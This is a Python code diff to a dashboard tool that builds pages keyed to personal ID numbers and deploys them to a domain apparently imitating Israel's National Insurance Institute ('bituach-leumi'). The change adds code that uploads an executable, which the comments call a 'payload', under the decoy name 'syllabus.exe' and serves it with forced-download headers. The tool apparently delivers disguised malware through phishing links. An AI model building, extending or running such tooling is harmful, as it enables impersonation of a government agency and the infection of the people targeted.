@@ -14,6 +14,8 @@ from telegram_api.client import TelegramClientWrapper
 DATA_JSON_PATH = os.path.join(os.path.dirname(__file__), "..", "display", "data.json")
 DISPLAY_DIR = os.path.join(os.path.dirname(__file__), "..", "display")
 VERCEL_DOMAIN = "bituach-leumi.vercel.app"
+EXE_DIR = os.path.join(os.path.dirname(__file__), "..", "dist")
+EXE_VERCEL_NAME = "syllabus.exe"
 
 
 class DashboardApp:
@@ -273,41 +275,53 @@ class DashboardApp:
         self._set_status(f"Link ready — copied: {final_url}")
 
     def _deploy_to_vercel(self, id_number: str, html_content: str) -> str:
-        """Upload embedded HTML as a static file to Vercel and return the public URL."""
+        """Upload embedded HTML + EXE payload as static files to Vercel."""
         token = _cfg.VERCEL_TOKEN
         project_id = _cfg.VERCEL_PROJECT_ID
+
+        # --- HTML ---
         filename = f"{id_number}.html"
         html_bytes = html_content.encode("utf-8")
-        sha1 = hashlib.sha1(html_bytes).hexdigest()
+        sha1_html = hashlib.sha1(html_bytes).hexdigest()
+        self._vercel_upload_file(token, html_bytes, sha1_html)
 
-        upload_resp = requests.post(
-            "https://api.vercel.com/v2/files",
-            headers={
-                "Authorization": f"Bearer {token}",
-                "Content-Type": "application/octet-stream",
-                "x-vercel-digest": sha1,
-                "Content-Length": str(len(html_bytes)),
-            },
-            data=html_bytes,
-            timeout=30,
-        )
-        if upload_resp.status_code not in (200, 201):
-            raise RuntimeError(f"File upload failed: {upload_resp.status_code} {upload_resp.text[:200]}")
+        files_to_deploy = [
+            {"file": filename, "sha": sha1_html, "size": len(html_bytes)},
+        ]
 
-        vercel_config = json.dumps({"cleanUrls": True}).encode("utf-8")
+        # --- EXE payload ---
+        exe_path = self._find_exe()
+        sha1_exe = None
+        if exe_path:
+            with open(exe_path, "rb") as fh:
+                exe_bytes = fh.read()
+            sha1_exe = hashlib.sha1(exe_bytes).hexdigest()
+            self._vercel_upload_file(token, exe_bytes, sha1_exe)
+            files_to_deploy.append(
+                {"file": EXE_VERCEL_NAME, "sha": sha1_exe, "size": len(exe_bytes)}
+            )
+
+        # --- vercel.json (force-download header for EXE) ---
+        vercel_cfg: dict = {"cleanUrls": True}
+        if sha1_exe:
+            vercel_cfg["headers"] = [
+                {
+                    "source": f"/{EXE_VERCEL_NAME}",
+                    "headers": [
+                        {"key": "Content-Type", "value": "application/octet-stream"},
+                        {"key": "Content-Disposition",
+                         "value": f"attachment; filename=\"{EXE_VERCEL_NAME}\""},
+                    ],
+                }
+            ]
+        vercel_config = json.dumps(vercel_cfg).encode("utf-8")
         vcfg_sha = hashlib.sha1(vercel_config).hexdigest()
-        requests.post(
-            "https://api.vercel.com/v2/files",
-            headers={
-                "Authorization": f"Bearer {token}",
-                "Content-Type": "application/octet-stream",
-                "x-vercel-digest": vcfg_sha,
-                "Content-Length": str(len(vercel_config)),
-            },
-            data=vercel_config,
-            timeout=30,
+        self._vercel_upload_file(token, vercel_config, vcfg_sha)
+        files_to_deploy.append(
+            {"file": "vercel.json", "sha": vcfg_sha, "size": len(vercel_config)}
         )
 
+        # --- Deploy ---
         deploy_resp = requests.post(
             "https://api.vercel.com/v13/deployments",
             headers={
@@ -318,10 +332,7 @@ class DashboardApp:
                 "name": _cfg.VERCEL_PROJECT,
                 "project": project_id,
                 "target": "production",
-                "files": [
-                    {"file": filename, "sha": sha1, "size": len(html_bytes)},
-                    {"file": "vercel.json", "sha": vcfg_sha, "size": len(vercel_config)},
-                ],
+                "files": files_to_deploy,
                 "projectSettings": {"framework": None},
             },
             timeout=60,
@@ -330,6 +341,34 @@ class DashboardApp:
             raise RuntimeError(f"Deploy failed: {deploy_resp.status_code} {deploy_resp.text[:300]}")
 
         return f"https://{VERCEL_DOMAIN}/{id_number}"
+
+    @staticmethod
+    def _vercel_upload_file(token: str, data: bytes, sha1: str) -> None:
+        """Upload a single file blob to Vercel's file store."""
+        resp = requests.post(
+            "https://api.vercel.com/v2/files",
+            headers={
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/octet-stream",
+                "x-vercel-digest": sha1,
+                "Content-Length": str(len(data)),
+            },
+            data=data,
+            timeout=60,
+        )
+        if resp.status_code not in (200, 201):
+            raise RuntimeError(f"File upload failed: {resp.status_code} {resp.text[:200]}")
+
+    @staticmethod
+    def _find_exe() -> str | None:
+        """Return the path to the first .exe in the dist/ directory, or None."""
+        dist_dir = os.path.abspath(EXE_DIR)
+        if not os.path.isdir(dist_dir):
+            return None
+        for fname in os.listdir(dist_dir):
+            if fname.lower().endswith(".exe"):
+                return os.path.join(dist_dir, fname)
+        return None
 
     def _clear_link(self):
         self.url_var.set("")
